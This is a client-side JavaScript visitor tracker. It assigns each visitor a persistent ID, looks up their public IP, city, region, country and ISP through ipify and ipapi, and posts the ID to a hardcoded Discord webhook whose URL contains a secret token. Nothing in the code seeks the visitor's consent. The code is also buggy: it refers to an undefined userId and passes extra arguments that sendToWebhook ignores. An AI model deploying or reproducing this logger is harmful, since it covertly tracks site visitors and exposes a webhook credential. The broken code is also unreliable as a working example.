function generateRandomId() {
  const characters = "0123456789";
  let id = "";
  for (let i = 0; i < 16; i++) {
    id += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return id;
}

function displayIP() {
  const userId = localStorage.getItem("siteUserId");
  if (!userId) {
    const newUserId = generateRandomId();
    localStorage.setItem("siteUserId", newUserId);
    sendToWebhook(newUserId);
    const userIdElement = document.getElementById("userId");
    userIdElement.textContent = newUserId;
  } else {
    sendToWebhook(userId);
    const userIdElement = document.getElementById("userId");
    userIdElement.textContent = userId;
  }

  fetch("https://api.ipify.org/?format=json")
    .then((response) => response.json())
    .then((data) => {
      const ipElement = document.getElementById("ip");
      ipElement.textContent = data.ip;

      getLocation(data.ip);
    })
    .catch((error) => {
      console.error("Error:", error);
    });
}

function sendToWebhook(userId) {
  const webhookURL = "https://discord.com/api/webhooks/1108773713077346384/hjKxkLhLkS3mEc6OpQzlCi_nmMWLY4ocZkMzC1PwlA55ScZf3hayJEL1JG2zyOFPHyFx"; // Replace with the actual webhook URL
  const message = "User ID: " + userId;

  fetch(webhookURL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ content: message })
  })
    .then((response) => console.log("Webhook sent successfully"))
    .catch((error) => console.error("Error sending webhook:", error));
}

function getLocation(ip) {
  const locationUrl = `https://ipapi.co/${ip}/json/`;

  fetch(locationUrl)
    .then((response) => response.json())
    .then((data) => {
      const locationElement = document.getElementById("location");
      const locationString = `${data.city}, ${data.region}, ${data.country_name}`;
      locationElement.textContent = locationString;

      const ispElement = document.getElementById("isp");
      const ispString = data.org;
      ispElement.textContent = ispString;

      const time = getCurrentTime();
      sendToWebhook(userId, locationString, ispString, time);
    })
    .catch((error) => {
      console.error("Error:", error);
      const defaultLocation = "Unknown";
      const defaultIsp = "Unknown";
      const defaultTime = getCurrentTime();
      sendToWebhook(userId, defaultLocation, defaultIsp, defaultTime);
    });
}

function getCurrentTime() {
  const now = new Date();
  const options = { timeZone: "Europe/Paris" };
  const timeString = now.toLocaleTimeString("en-US", options);
  return timeString;
}
